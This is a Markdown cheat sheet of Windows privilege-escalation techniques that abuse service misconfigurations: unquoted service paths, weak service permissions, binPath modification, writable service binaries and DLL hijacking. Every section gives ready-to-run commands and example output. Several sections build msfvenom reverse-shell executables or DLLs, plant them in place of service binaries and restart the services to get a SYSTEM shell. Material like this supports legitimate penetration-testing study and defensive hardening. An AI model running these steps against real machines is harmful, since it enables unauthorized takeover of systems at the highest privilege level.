# SERVICE MISCONFIGURATIONS

### List all services

```bash
sc queryex type=service state=all
Get-Service
wmic service list brief
```

> See all services

**Why:** Look for non-default services

<details>
<summary>Example Output</summary>

```
sc queryex type=service state=all | findstr /i 'SERVICE_NAME\|DISPLAY_NAME\|STATE'
SERVICE_NAME: CustomSvc
DISPLAY_NAME: Custom Application
STATE: 4 RUNNING
(Find non-default services to investigate)
```
</details>

---

### Unquoted service paths

```bash
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
```

> Paths with spaces, no quotes

**Why:** C:\Program Files\My App\svc.exe = hijack

<details>
<summary>Example Output</summary>

```
wmic service get name,pathname | findstr /v "C:\Windows"
CustomSvc  C:\Program Files\My App\service.exe

Path has spaces + no quotes = hijackable
Place: C:\Program Files\My.exe
Restart service -> runs your exe as SYSTEM
```
</details>

---

### Exploit unquoted path

```bash
If path: C:\Program Files\My App\service.exe
Place malicious exe at: C:\Program.exe
or: C:\Program Files\My.exe
```

> Windows tries each space as path end

**Why:** Restart service to trigger

<details>
<summary>Example Output</summary>

```
Path: C:\Program Files\My App\service.exe

msfvenom -p windows/x64/shell_reverse_tcp ... -f exe -o 'C:\Program Files\My.exe'

sc stop CustomSvc
sc start CustomSvc

Attacker:
C:\> whoami
nt authority\system
```
</details>

---

### Weak service permissions

```bash
accesschk.exe -uwcqv * /accepteula
or: sc qc <service_name>
```

> Can you modify service config?

**Why:** Change binPath to your payload

<details>
<summary>Example Output</summary>

```
accesschk.exe -uwcqv 'Everyone' * /accepteula
RW CustomService
  SERVICE_ALL_ACCESS

sc config CustomService binPath= 'C:\temp\rev.exe'
sc stop CustomService
sc start CustomService
(Shell as SYSTEM)
```
</details>

---

### Modify service binary path

```bash
sc config <service> binPath= 'C:\temp\rev.exe'
sc stop <service>
sc start <service>
```

> Point service to your payload

**Why:** Runs as service account (often SYSTEM)

<details>
<summary>Example Output</summary>

```
sc config CustomSvc binPath= 'C:\temp\rev.exe'
[SC] ChangeServiceConfig SUCCESS

sc stop CustomSvc
sc start CustomSvc

Attacker:
C:\> whoami
nt authority\system
```
</details>

---

### Writable service binary

```bash
icacls 'C:\path\to\service.exe'
Look for: (F) or (M) for your user
```

> Replace the actual binary

**Why:** Overwrite with reverse shell

<details>
<summary>Example Output</summary>

```
icacls C:\custom\svc.exe
BUILTIN\Users:(F)  <- FULL CONTROL!

copy C:\temp\rev.exe C:\custom\svc.exe /Y
sc stop CustomSvc
sc start CustomSvc
(Your payload runs as SYSTEM)
```
</details>

---

### DLL hijacking (services)

```bash
Process Monitor: filter for NAME NOT FOUND on .dll
Place malicious DLL in search path
```

> Service loads missing DLL

**Why:** DLL runs as service user

<details>
<summary>Example Output</summary>

```
Process Monitor filter: Result=NAME NOT FOUND, Path ends with .dll
CustomSvc.exe -> C:\custom\missing.dll NOT FOUND

msfvenom -p windows/x64/shell_reverse_tcp ... -f dll -o C:\custom\missing.dll
Restart service -> shell as SYSTEM
```
</details>

---

### Service restart permissions

```bash
sc stop <service>
sc start <service>
or reboot if you can
```

> Need to trigger the service

**Why:** Some need admin to restart

<details>
<summary>Example Output</summary>

```
sc stop CustomSvc
[SC] Access denied

Try: shutdown /r /t 0
OR wait for scheduled restart
OR: sc config CustomSvc start=auto
(Service restarts after reboot)
```
</details>

---
